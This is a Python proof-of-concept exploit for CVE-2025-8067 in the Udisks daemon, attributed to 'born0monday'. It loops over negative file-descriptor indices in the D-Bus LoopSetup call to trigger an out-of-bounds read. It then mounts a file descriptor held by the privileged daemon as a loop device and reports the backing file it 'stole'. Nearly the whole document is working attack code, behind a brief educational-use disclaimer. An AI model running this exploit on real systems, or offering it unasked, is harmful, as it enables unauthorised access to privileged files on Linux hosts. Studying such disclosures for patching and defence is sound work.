# Exploit Proof of Concept (PoC)
#
# Author: born0monday
# Target: Udisks daemon
# CVE: CVE-2025-8067
# Description:
# This script "steals" an open file descriptor of the Udisks daemon and
# mounts it as a loop device through an OOB read.
#
# Disclaimer:
# This code is for educational and research purposes only.
# Use it responsibly and only on systems you have explicit permission to test.

from gi.repository import Gio, GLib

def setup_loop(bus, idx):
     proxy = Gio.DBusProxy.new_sync(
         bus,
         Gio.DBusProxyFlags.NONE,
         None,
         "org.freedesktop.UDisks2",
         "/org/freedesktop/UDisks2/Manager",
         "org.freedesktop.UDisks2.Manager",
         None
     )

     fdlist = Gio.UnixFDList()
     fdlist.append(1)

     result = proxy.call_with_unix_fd_list_sync(
         "LoopSetup",
         GLib.Variant("(ha{sv})", (idx, {})),
         Gio.DBusCallFlags.NONE,
         -1,
         fdlist,
         None,
     )

     return result[0].unpack()[0]


def get_backing_file(bus, dev):
     proxy = Gio.DBusProxy.new_sync(
         bus,
         Gio.DBusProxyFlags.NONE,
         None,
         "org.freedesktop.UDisks2",
         dev,
         "org.freedesktop.UDisks2.Loop",
         None
     )
     return bytes(proxy.get_cached_property("BackingFile")).decode()


if __name__ == "__main__":
     bus = Gio.bus_get_sync(Gio.BusType.SYSTEM, None)

     print("[+] Trying loop setup with oob indices")
     for i in range(-1, -1000, -1):
         try:
             dev = setup_loop(bus, i)
             print("[+] Hit valid fd at index", i)
             print("[+] Setup loop device", dev)
             break
         except Exception:
             pass

     backing_file = get_backing_file(bus, dev)
     print("[+] Stole fd for", backing_file)
